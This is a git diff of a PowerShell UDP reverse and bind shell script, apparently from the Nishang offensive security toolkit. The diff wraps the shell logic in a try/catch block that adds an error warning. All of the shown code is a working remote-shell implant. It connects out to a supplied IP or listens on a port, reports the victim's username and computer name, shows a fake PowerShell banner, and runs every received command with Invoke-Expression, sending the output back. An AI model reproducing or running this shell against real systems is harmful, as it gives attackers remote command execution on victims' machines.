@@ -63,63 +63,72 @@ https://github.com/samratashok/nishang
 
     )
 
-    #Connect back if the reverse switch is used.
-    if ($Reverse)
-    {
-        $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPAddress),$Port)
-
-        # Regex from http://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses
-        if ($IPAddress -match "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))")
-        {
-            $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
-        }
-        else
-        {
-            $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
-        }
-    }
-
-    #Bind to the provided port if Bind switch is used.
-   if ($Bind)
-    {
-        $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::ANY,$Port)
         
-        if ($IPv6)
-        {
-            $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
-        }
-        else
-        {
-            $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
-        }
-        
-        $client.Receive([ref]$endpoint)
-    }
-
-    [byte[]]$bytes = 0..255|%{0}
-
-    #Send back current username and computername
-    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
-    $client.Send($sendbytes,$sendbytes.Length,$endpoint)
-
-    #Show an interactive PowerShell prompt
-    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
-    $client.Send($sendbytes,$sendbytes.Length,$endpoint)
-    
-    while($true)
+    try 
     {
-        $receivebytes = $client.Receive([ref]$endpoint)
-        $returndata = ([text.encoding]::ASCII).GetString($receivebytes)
-        $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
+        #Connect back if the reverse switch is used.
+        if ($Reverse)
+        {
+            $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPAddress),$Port)
 
-        $sendback = $result +  'PS ' + (Get-Location).Path + '> '
-        $x = ($error[0] | Out-String)
-        $error.clear()
-        $sendback2 = $sendback + $x
+            # Regex from http://stackoverflow.com/questions/53497/regular-expression-that-matches-valid-ipv6-addresses
+            if ($IPAddress -match "(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))")
+            {
+                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
+            }
+            else
+            {
+                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
+            }
+        }
 
-        #Send results back
-        $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2)
+        #Bind to the provided port if Bind switch is used.
+       if ($Bind)
+        {
+            $endpoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::ANY,$Port)
+        
+            if ($IPv6)
+            {
+                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetworkV6)
+            }
+            else
+            {
+                $client = New-Object System.Net.Sockets.UDPClient($Port, [System.Net.Sockets.AddressFamily]::InterNetwork)
+            }
+        
+            $client.Receive([ref]$endpoint)
+        }
+
+        [byte[]]$bytes = 0..255|%{0}
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
         $client.Send($sendbytes,$sendbytes.Length,$endpoint)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '> ')
+        $client.Send($sendbytes,$sendbytes.Length,$endpoint)
+    
+        while($true)
+        {
+            $receivebytes = $client.Receive([ref]$endpoint)
+            $returndata = ([text.encoding]::ASCII).GetString($receivebytes)
+            $result = (Invoke-Expression -Command $returndata 2>&1 | Out-String )
+
+            $sendback = $result +  'PS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback + $x
+
+            #Send results back
+            $sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $client.Send($sendbytes,$sendbytes.Length,$endpoint)
+        }
+        $client.Close()
     }
-    $client.Close()
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
 }
